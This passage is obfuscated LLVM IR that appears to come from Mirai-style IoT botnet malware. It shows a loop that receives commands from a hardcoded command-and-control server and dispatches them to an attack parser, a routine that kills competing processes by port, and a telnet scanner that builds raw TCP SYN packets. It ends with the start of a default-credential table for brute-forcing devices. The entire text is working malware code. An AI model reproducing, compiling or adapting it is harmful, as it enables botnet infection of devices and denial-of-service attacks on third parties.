  %315 = call i64 @send(i32 %311, i8* %312, i64 %314, i32 16384)
  br label %316

; <label>:316:                                    ; preds = %310, %298
  br label %317

; <label>:317:                                    ; preds = %316, %287
  br label %318

; <label>:318:                                    ; preds = %317, %280
  br label %435

; <label>:319:                                    ; preds = %257
  %320 = load i32, i32* @fd_serv, align 4
  %321 = icmp ne i32 %320, -1
  br i1 %321, label %322, label %434

; <label>:322:                                    ; preds = %319
  %323 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %324 = load i32, i32* @fd_serv, align 4
  %325 = sdiv i32 %324, 64
  %326 = sext i32 %325 to i64
  %327 = getelementptr inbounds [16 x i64], [16 x i64]* %323, i64 0, i64 %326
  %328 = load i64, i64* %327, align 8
  %329 = load i32, i32* @fd_serv, align 4
  %330 = srem i32 %329, 64
  %331 = zext i32 %330 to i64
  %332 = shl i64 1, %331
  %333 = xor i64 %328, -1
  %334 = xor i64 %332, -1
  %335 = xor i64 -3884546884975272132, -1
  %336 = or i64 %333, %334
  %337 = or i64 -3884546884975272132, %335
  %338 = xor i64 %336, -1
  %339 = and i64 %338, %337
  %340 = and i64 %328, %332
  %341 = icmp ne i64 %339, 0
  br i1 %341, label %342, label %434

; <label>:342:                                    ; preds = %322
  %343 = call i32* @__errno_location() #9
  store i32 0, i32* %343, align 4
  %344 = load i32, i32* @fd_serv, align 4
  %345 = bitcast i16* %27 to i8*
  %346 = call i64 @recv(i32 %344, i8* %345, i64 2, i32 16386)
  %347 = trunc i64 %346 to i32
  store i32 %347, i32* %26, align 4
  %348 = load i32, i32* %26, align 4
  %349 = icmp eq i32 %348, -1
  br i1 %349, label %350, label %365

; <label>:350:                                    ; preds = %342
  %351 = call i32* @__errno_location() #9
  %352 = load i32, i32* %351, align 4
  %353 = icmp eq i32 %352, 11
  br i1 %353, label %362, label %354

; <label>:354:                                    ; preds = %350
  %355 = call i32* @__errno_location() #9
  %356 = load i32, i32* %355, align 4
  %357 = icmp eq i32 %356, 11
  br i1 %357, label %362, label %358

; <label>:358:                                    ; preds = %354
  %359 = call i32* @__errno_location() #9
  %360 = load i32, i32* %359, align 4
  %361 = icmp eq i32 %360, 4
  br i1 %361, label %362, label %363

; <label>:362:                                    ; preds = %358, %354, %350
  br label %86

; <label>:363:                                    ; preds = %358
  store i32 0, i32* %26, align 4
  br label %364

; <label>:364:                                    ; preds = %363
  br label %365

; <label>:365:                                    ; preds = %364, %342
  %366 = load i32, i32* %26, align 4
  %367 = icmp eq i32 %366, 0
  br i1 %367, label %368, label %369

; <label>:368:                                    ; preds = %365
  call void @teardown_connection()
  br label %86

; <label>:369:                                    ; preds = %365
  %370 = load i16, i16* %27, align 2
  %371 = zext i16 %370 to i32
  %372 = icmp eq i32 %371, 0
  br i1 %372, label %373, label %377

; <label>:373:                                    ; preds = %369
  %374 = load i32, i32* @fd_serv, align 4
  %375 = bitcast i16* %27 to i8*
  %376 = call i64 @recv(i32 %374, i8* %375, i64 2, i32 16384)
  br label %86

; <label>:377:                                    ; preds = %369
  %378 = load i16, i16* %27, align 2
  %379 = call zeroext i16 @ntohs(i16 zeroext %378) #9
  store i16 %379, i16* %27, align 2
  %380 = load i16, i16* %27, align 2
  %381 = zext i16 %380 to i64
  %382 = icmp ugt i64 %381, 1024
  br i1 %382, label %383, label %386

; <label>:383:                                    ; preds = %377
  %384 = load i32, i32* @fd_serv, align 4
  %385 = call i32 @close(i32 %384)
  store i32 -1, i32* @fd_serv, align 4
  br label %386

; <label>:386:                                    ; preds = %383, %377
  %387 = call i32* @__errno_location() #9
  store i32 0, i32* %387, align 4
  %388 = load i32, i32* @fd_serv, align 4
  %389 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %390 = load i16, i16* %27, align 2
  %391 = zext i16 %390 to i64
  %392 = call i64 @recv(i32 %388, i8* %389, i64 %391, i32 16386)
  %393 = trunc i64 %392 to i32
  store i32 %393, i32* %26, align 4
  %394 = load i32, i32* %26, align 4
  %395 = icmp eq i32 %394, -1
  br i1 %395, label %396, label %411

; <label>:396:                                    ; preds = %386
  %397 = call i32* @__errno_location() #9
  %398 = load i32, i32* %397, align 4
  %399 = icmp eq i32 %398, 11
  br i1 %399, label %408, label %400

; <label>:400:                                    ; preds = %396
  %401 = call i32* @__errno_location() #9
  %402 = load i32, i32* %401, align 4
  %403 = icmp eq i32 %402, 11
  br i1 %403, label %408, label %404

; <label>:404:                                    ; preds = %400
  %405 = call i32* @__errno_location() #9
  %406 = load i32, i32* %405, align 4
  %407 = icmp eq i32 %406, 4
  br i1 %407, label %408, label %409

; <label>:408:                                    ; preds = %404, %400, %396
  br label %86

; <label>:409:                                    ; preds = %404
  store i32 0, i32* %26, align 4
  br label %410

; <label>:410:                                    ; preds = %409
  br label %411

; <label>:411:                                    ; preds = %410, %386
  %412 = load i32, i32* %26, align 4
  %413 = icmp eq i32 %412, 0
  br i1 %413, label %414, label %415

; <label>:414:                                    ; preds = %411
  call void @teardown_connection()
  br label %86

; <label>:415:                                    ; preds = %411
  %416 = load i32, i32* @fd_serv, align 4
  %417 = bitcast i16* %27 to i8*
  %418 = call i64 @recv(i32 %416, i8* %417, i64 2, i32 16384)
  %419 = load i16, i16* %27, align 2
  %420 = call zeroext i16 @ntohs(i16 zeroext %419) #9
  store i16 %420, i16* %27, align 2
  %421 = load i32, i32* @fd_serv, align 4
  %422 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %423 = load i16, i16* %27, align 2
  %424 = zext i16 %423 to i64
  %425 = call i64 @recv(i32 %421, i8* %422, i64 %424, i32 16384)
  %426 = load i16, i16* %27, align 2
  %427 = zext i16 %426 to i32
  %428 = icmp sgt i32 %427, 0
  br i1 %428, label %429, label %433

; <label>:429:                                    ; preds = %415
  %430 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %431 = load i16, i16* %27, align 2
  %432 = zext i16 %431 to i32
  call void @attack_parse(i8* %430, i32 %432)
  br label %433

; <label>:433:                                    ; preds = %429, %415
  br label %434

; <label>:434:                                    ; preds = %433, %322, %319
  br label %435

; <label>:435:                                    ; preds = %434, %318
  br label %86
                                                  ; No predecessors!
  %437 = load i32, i32* %3, align 4
  ret i32 %437
}

; Function Attrs: nounwind
declare i32 @unlink(i8*) #1

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #1

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #1

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #1

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #1

; Function Attrs: nounwind
declare i32 @chdir(i8*) #1

declare void @table_init() #2

; Function Attrs: noinline nounwind uwtable
define internal void @ensure_single_instance() #0 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca i32, align 4
  %3 = alloca %union.__SOCKADDR_ARG, align 8
  %4 = alloca %union.__SOCKADDR_ARG, align 8
  store i32 1, i32* %2, align 4
  %5 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %5, i32* @fd_ctrl, align 4
  %6 = icmp eq i32 %5, -1
  br i1 %6, label %7, label %8

; <label>:7:                                      ; preds = %0
  br label %89

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* @fd_ctrl, align 4
  %10 = bitcast i32* %2 to i8*
  %11 = call i32 @setsockopt(i32 %9, i32 1, i32 2, i8* %10, i32 4) #7
  %12 = load i32, i32* @fd_ctrl, align 4
  %13 = load i32, i32* @fd_ctrl, align 4
  %14 = call i32 (i32, i32, ...) @fcntl(i32 %13, i32 3, i32 0)
  %15 = xor i32 2048, -1
  %16 = xor i32 %14, -1
  %17 = xor i32 1479197522, -1
  %18 = and i32 %15, 1479197522
  %19 = and i32 2048, %17
  %20 = and i32 %16, 1479197522
  %21 = and i32 %14, %17
  %22 = or i32 %18, %19
  %23 = or i32 %20, %21
  %24 = xor i32 %22, %23
  %25 = or i32 %15, %16
  %26 = xor i32 %25, -1
  %27 = or i32 1479197522, %17
  %28 = and i32 %26, %27
  %29 = or i32 %24, %28
  %30 = or i32 2048, %14
  %31 = call i32 (i32, i32, ...) @fcntl(i32 %12, i32 4, i32 %29)
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 0
  store i16 2, i16* %32, align 4
  %33 = load i8, i8* @ensure_single_instance.local_bind, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %38

; <label>:36:                                     ; preds = %8
  %37 = call i32 @htonl(i32 2130706433) #9
  br label %40

; <label>:38:                                     ; preds = %8
  %39 = load i32, i32* @LOCAL_ADDR, align 4
  br label %40

; <label>:40:                                     ; preds = %38, %36
  %41 = phi i32 [ %37, %36 ], [ %39, %38 ]
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 2
  %43 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %42, i32 0, i32 0
  store i32 %41, i32* %43, align 4
  %44 = call zeroext i16 @htons(i16 zeroext -14435) #9
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 1
  store i16 %44, i16* %45, align 2
  %46 = call i32* @__errno_location() #9
  store i32 0, i32* %46, align 4
  %47 = load i32, i32* @fd_ctrl, align 4
  %48 = bitcast %union.__SOCKADDR_ARG* %3 to %struct.sockaddr**
  %49 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  store %struct.sockaddr* %49, %struct.sockaddr** %48, align 8
  %50 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %3, i32 0, i32 0
  %51 = load %struct.sockaddr*, %struct.sockaddr** %50, align 8
  %52 = call i32 @bind(i32 %47, %struct.sockaddr* %51, i32 16) #7
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %83

; <label>:54:                                     ; preds = %40
  %55 = call i32* @__errno_location() #9
  %56 = load i32, i32* %55, align 4
  %57 = icmp eq i32 %56, 99
  br i1 %57, label %58, label %63

; <label>:58:                                     ; preds = %54
  %59 = load i8, i8* @ensure_single_instance.local_bind, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %62, label %63

; <label>:62:                                     ; preds = %58
  store i8 0, i8* @ensure_single_instance.local_bind, align 1
  br label %63

; <label>:63:                                     ; preds = %62, %58, %54
  %64 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 0
  store i16 2, i16* %64, align 4
  %65 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 2
  %66 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %65, i32 0, i32 0
  store i32 0, i32* %66, align 4
  %67 = call zeroext i16 @htons(i16 zeroext -14435) #9
  %68 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i32 0, i32 1
  store i16 %67, i16* %68, align 2
  %69 = load i32, i32* @fd_ctrl, align 4
  %70 = bitcast %union.__SOCKADDR_ARG* %4 to %struct.sockaddr**
  %71 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  store %struct.sockaddr* %71, %struct.sockaddr** %70, align 8
  %72 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %4, i32 0, i32 0
  %73 = load %struct.sockaddr*, %struct.sockaddr** %72, align 8
  %74 = call i32 @connect(i32 %69, %struct.sockaddr* %73, i32 16)
  %75 = icmp eq i32 %74, -1
  br i1 %75, label %76, label %77

; <label>:76:                                     ; preds = %63
  br label %77

; <label>:77:                                     ; preds = %76, %63
  %78 = call i32 @sleep(i32 5)
  %79 = load i32, i32* @fd_ctrl, align 4
  %80 = call i32 @close(i32 %79)
  %81 = call zeroext i16 @htons(i16 zeroext -14435) #9
  %82 = call signext i8 @killer_kill_by_port(i16 zeroext %81)
  call void @ensure_single_instance()
  br label %89

; <label>:83:                                     ; preds = %40
  %84 = load i32, i32* @fd_ctrl, align 4
  %85 = call i32 @listen(i32 %84, i32 1) #7
  %86 = icmp eq i32 %85, -1
  br i1 %86, label %87, label %88

; <label>:87:                                     ; preds = %83
  br label %88

; <label>:88:                                     ; preds = %87, %83
  br label %89

; <label>:89:                                     ; preds = %88, %77, %7
  ret void
}

declare void @rand_init() #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #3

declare i32 @util_strlen(i8*) #2

declare i32 @util_strcpy(i8*, i8*) #2

; Function Attrs: nounwind
declare i32 @prctl(i32, ...) #1

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

; Function Attrs: nounwind
declare i32 @setsid() #1

declare i32 @close(i32) #2

declare signext i8 @attack_init() #2

; Function Attrs: noinline nounwind uwtable
define internal void @establish_connection() #0 {
  %1 = alloca %union.__SOCKADDR_ARG, align 8
  %2 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %2, i32* @fd_serv, align 4
  %3 = icmp eq i32 %2, -1
  br i1 %3, label %4, label %5

; <label>:4:                                      ; preds = %0
  br label %21

; <label>:5:                                      ; preds = %0
  store i16 2, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 0), align 4
  %6 = call i32 @htonl(i32 -1335130672) #9
  store i32 %6, i32* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 2, i32 0), align 4
  %7 = call zeroext i16 @htons(i16 zeroext 1024) #9
  store i16 %7, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 1), align 2
  %8 = load i32, i32* @fd_serv, align 4
  %9 = load i32, i32* @fd_serv, align 4
  %10 = call i32 (i32, i32, ...) @fcntl(i32 %9, i32 3, i32 0)
  %11 = and i32 2048, %10
  %12 = xor i32 2048, %10
  %13 = or i32 %11, %12
  %14 = or i32 2048, %10
  %15 = call i32 (i32, i32, ...) @fcntl(i32 %8, i32 4, i32 %13)
  store i8 1, i8* @pending_connection, align 1
  %16 = load i32, i32* @fd_serv, align 4
  %17 = bitcast %union.__SOCKADDR_ARG* %1 to %struct.sockaddr**
  store %struct.sockaddr* bitcast (%struct.sockaddr_in* @srv_addr to %struct.sockaddr*), %struct.sockaddr** %17, align 8
  %18 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %1, i32 0, i32 0
  %19 = load %struct.sockaddr*, %struct.sockaddr** %18, align 8
  %20 = call i32 @connect(i32 %16, %struct.sockaddr* %19, i32 16)
  br label %21

; <label>:21:                                     ; preds = %5, %4
  ret void
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #2

declare i64 @send(i32, i8*, i64, i32) #2

declare i32 @accept(i32, %struct.sockaddr*, i32*) #2

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

declare void @attack_kill_all() #2

; Function Attrs: noinline nounwind uwtable
define internal void @teardown_connection() #0 {
  %1 = load i32, i32* @fd_serv, align 4
  %2 = icmp ne i32 %1, -1
  br i1 %2, label %3, label %6

; <label>:3:                                      ; preds = %0
  %4 = load i32, i32* @fd_serv, align 4
  %5 = call i32 @close(i32 %4)
  br label %6

; <label>:6:                                      ; preds = %3, %0
  store i32 -1, i32* @fd_serv, align 4
  %7 = call i32 @sleep(i32 1)
  ret void
}

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i32 @rand_next() #2

declare i32 @sleep(i32) #2

declare i32 @util_local_addr() #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #5

declare i64 @recv(i32, i8*, i64, i32) #2

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) #5

declare void @attack_parse(i8*, i32) #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #5

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #5

declare i32 @fcntl(i32, i32, ...) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare signext i8 @killer_kill_by_port(i16 zeroext) #2

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @scanner_init() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca %struct.iphdr*, align 8
  %5 = alloca %struct.tcphdr*, align 8
  %6 = alloca %struct.payload*, align 8
  %7 = alloca %struct.binary*, align 8
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.__sigset_t, align 8
  %10 = alloca %struct.scanner_connection*, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca %struct.iphdr*, align 8
  %19 = alloca %struct.tcphdr*, align 8
  %20 = alloca %union.__SOCKADDR_ARG, align 8
  %21 = alloca i32, align 4
  %22 = alloca [1514 x i8], align 16
  %23 = alloca %struct.iphdr*, align 8
  %24 = alloca %struct.tcphdr*, align 8
  %25 = alloca %struct.scanner_connection*, align 8
  %26 = alloca %union.__SOCKADDR_ARG, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = call i32 @fork() #7
  store i32 %37, i32* @scanner_pid, align 4
  %38 = load i32, i32* @scanner_pid, align 4
  %39 = icmp sgt i32 %38, 0
  br i1 %39, label %43, label %40

; <label>:40:                                     ; preds = %0
  %41 = load i32, i32* @scanner_pid, align 4
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %40, %0
  ret void

; <label>:44:                                     ; preds = %40
  %45 = call i32 @util_local_addr()
  store i32 %45, i32* @LOCAL_ADDR, align 4
  call void @rand_init()
  %46 = call i64 @time(i64* null) #7
  %47 = trunc i64 %46 to i32
  store i32 %47, i32* @fake_time, align 4
  %48 = call noalias i8* @calloc(i64 628, i64 8264) #7
  %49 = bitcast i8* %48 to %struct.scanner_connection*
  store %struct.scanner_connection* %49, %struct.scanner_connection** %3, align 8
  store i32 0, i32* %1, align 4
  br label %50

; <label>:50:                                     ; preds = %74, %44
  %51 = load i32, i32* %1, align 4
  %52 = icmp slt i32 %51, 628
  br i1 %52, label %53, label %81

; <label>:53:                                     ; preds = %50
  %54 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %55 = load i32, i32* %1, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %54, i64 %56
  %58 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %57, i32 0, i32 16
  store i32 0, i32* %58, align 8
  %59 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %60 = load i32, i32* %1, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %59, i64 %61
  %63 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %62, i32 0, i32 2
  store i32 -1, i32* %63, align 8
  %64 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %65 = load i32, i32* %1, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %64, i64 %66
  %68 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %67, i32 0, i32 12
  store i8 0, i8* %68, align 1
  %69 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %70 = load i32, i32* %1, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %69, i64 %71
  %73 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %72, i32 0, i32 6
  store i32 0, i32* %73, align 8
  br label %74

; <label>:74:                                     ; preds = %53
  %75 = load i32, i32* %1, align 4
  %76 = sub i32 0, %75
  %77 = sub i32 0, 1
  %78 = add i32 %76, %77
  %79 = sub i32 0, %78
  %80 = add nsw i32 %75, 1
  store i32 %79, i32* %1, align 4
  br label %50

; <label>:81:                                     ; preds = %50
  %82 = call i32 @socket(i32 2, i32 3, i32 6) #7
  store i32 %82, i32* @rsck, align 4
  %83 = icmp eq i32 %82, -1
  br i1 %83, label %84, label %85

; <label>:84:                                     ; preds = %81
  call void @exit(i32 0) #8
  unreachable

; <label>:85:                                     ; preds = %81
  %86 = load i32, i32* @rsck, align 4
  %87 = load i32, i32* @rsck, align 4
  %88 = call i32 (i32, i32, ...) @fcntl(i32 %87, i32 3, i32 0)
  %89 = xor i32 2048, -1
  %90 = xor i32 %88, -1
  %91 = xor i32 496456867, -1
  %92 = and i32 %89, 496456867
  %93 = and i32 2048, %91
  %94 = and i32 %90, 496456867
  %95 = and i32 %88, %91
  %96 = or i32 %92, %93
  %97 = or i32 %94, %95
  %98 = xor i32 %96, %97
  %99 = or i32 %89, %90
  %100 = xor i32 %99, -1
  %101 = or i32 496456867, %91
  %102 = and i32 %100, %101
  %103 = or i32 %98, %102
  %104 = or i32 2048, %88
  %105 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 4, i32 %103)
  store i32 1, i32* %1, align 4
  %106 = load i32, i32* @rsck, align 4
  %107 = bitcast i32* %1 to i8*
  %108 = call i32 @setsockopt(i32 %106, i32 0, i32 3, i8* %107, i32 4) #7
  %109 = icmp ne i32 %108, 0
  br i1 %109, label %110, label %113

; <label>:110:                                    ; preds = %85
  %111 = load i32, i32* @rsck, align 4
  %112 = call i32 @close(i32 %111)
  call void @exit(i32 0) #8
  unreachable

; <label>:113:                                    ; preds = %85
  br label %114

; <label>:114:                                    ; preds = %125, %113
  %115 = call i32 @rand_next()
  %116 = xor i32 %115, -1
  %117 = xor i32 65535, -1
  %118 = xor i32 1351111569, -1
  %119 = or i32 %116, %117
  %120 = or i32 1351111569, %118
  %121 = xor i32 %119, -1
  %122 = and i32 %121, %120
  %123 = and i32 %115, 65535
  %124 = trunc i32 %122 to i16
  store i16 %124, i16* %2, align 2
  br label %125

; <label>:125:                                    ; preds = %114
  %126 = load i16, i16* %2, align 2
  %127 = call zeroext i16 @ntohs(i16 zeroext %126) #9
  %128 = zext i16 %127 to i32
  %129 = icmp slt i32 %128, 1024
  br i1 %129, label %114, label %130

; <label>:130:                                    ; preds = %125
  store %struct.iphdr* bitcast ([40 x i8]* @scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %4, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %132 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %131, i64 1
  %133 = bitcast %struct.iphdr* %132 to %struct.tcphdr*
  store %struct.tcphdr* %133, %struct.tcphdr** %5, align 8
  %134 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %135 = bitcast %struct.iphdr* %134 to i8*
  %136 = load i8, i8* %135, align 4
  %137 = xor i8 %136, -1
  %138 = xor i8 -16, -1
  %139 = xor i8 90, -1
  %140 = or i8 %137, %138
  %141 = or i8 90, %139
  %142 = xor i8 %140, -1
  %143 = and i8 %142, %141
  %144 = and i8 %136, -16
  %145 = xor i8 %143, -1
  %146 = xor i8 5, -1
  %147 = xor i8 57, -1
  %148 = and i8 %145, 57
  %149 = and i8 %143, %147
  %150 = and i8 %146, 57
  %151 = and i8 5, %147
  %152 = or i8 %148, %149
  %153 = or i8 %150, %151
  %154 = xor i8 %152, %153
  %155 = or i8 %145, %146
  %156 = xor i8 %155, -1
  %157 = or i8 57, %147
  %158 = and i8 %156, %157
  %159 = or i8 %154, %158
  %160 = or i8 %143, 5
  store i8 %159, i8* %135, align 4
  %161 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %162 = bitcast %struct.iphdr* %161 to i8*
  %163 = load i8, i8* %162, align 4
  %164 = xor i8 15, -1
  %165 = xor i8 %163, %164
  %166 = and i8 %165, %163
  %167 = and i8 %163, 15
  %168 = and i8 %166, 64
  %169 = xor i8 %166, 64
  %170 = or i8 %168, %169
  %171 = or i8 %166, 64
  store i8 %170, i8* %162, align 4
  %172 = call zeroext i16 @htons(i16 zeroext 40) #9
  %173 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 2
  store i16 %172, i16* %174, align 2
  %175 = call i32 @rand_next()
  %176 = trunc i32 %175 to i16
  %177 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 3
  store i16 %176, i16* %178, align 4
  %179 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 5
  store i8 64, i8* %180, align 4
  %181 = load %struct.iphdr*, %struct.iphdr** %4, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 6
  store i8 6, i8* %182, align 1
  %183 = call zeroext i16 @htons(i16 zeroext 23) #9
  %184 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
  %185 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %184, i32 0, i32 1
  store i16 %183, i16* %185, align 2
  %186 = load i16, i16* %2, align 2
  %187 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
  %188 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %187, i32 0, i32 0
  store i16 %186, i16* %188, align 4
  %189 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
  %190 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %189, i32 0, i32 4
  %191 = load i16, i16* %190, align 4
  %192 = xor i16 -241, -1
  %193 = xor i16 %191, %192
  %194 = and i16 %193, %191
  %195 = and i16 %191, -241
  %196 = xor i16 %194, -1
  %197 = xor i16 80, -1
  %198 = xor i16 3683, -1
  %199 = and i16 %196, 3683
  %200 = and i16 %194, %198
  %201 = and i16 %197, 3683
  %202 = and i16 80, %198
  %203 = or i16 %199, %200
  %204 = or i16 %201, %202
  %205 = xor i16 %203, %204
  %206 = or i16 %196, %197
  %207 = xor i16 %206, -1
  %208 = or i16 3683, %198
  %209 = and i16 %207, %208
  %210 = or i16 %205, %209
  %211 = or i16 %194, 80
  store i16 %210, i16* %190, align 4
  %212 = call i32 @rand_next()
  %213 = xor i32 %212, -1
  %214 = xor i32 65535, -1
  %215 = xor i32 -1702316942, -1
  %216 = or i32 %213, %214
  %217 = or i32 -1702316942, %215
  %218 = xor i32 %216, -1
  %219 = and i32 %218, %217
  %220 = and i32 %212, 65535
  %221 = trunc i32 %219 to i16
  %222 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 5
  store i16 %221, i16* %223, align 2
  %224 = load %struct.tcphdr*, %struct.tcphdr** %5, align 8
  %225 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %224, i32 0, i32 4
  %226 = load i16, i16* %225, align 4
  %227 = xor i16 %226, -1
  %228 = xor i16 -513, -1
  %229 = xor i16 24772, -1
  %230 = or i16 %227, %228
  %231 = or i16 24772, %229
  %232 = xor i16 %230, -1
  %233 = and i16 %232, %231
  %234 = and i16 %226, -513
  %235 = and i16 %233, 512
  %236 = xor i16 %233, 512
  %237 = or i16 %235, %236
  %238 = or i16 %233, 512
  store i16 %237, i16* %225, align 4
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.21, i32 0, i32 0), i16 zeroext 3)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.22, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.23, i32 0, i32 0), i16 zeroext 7)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i32 0, i32 0), i16 zeroext 10)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.25, i32 0, i32 0), i16 zeroext 5)
  call void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i32 0, i32 0), i16 zeroext 15)
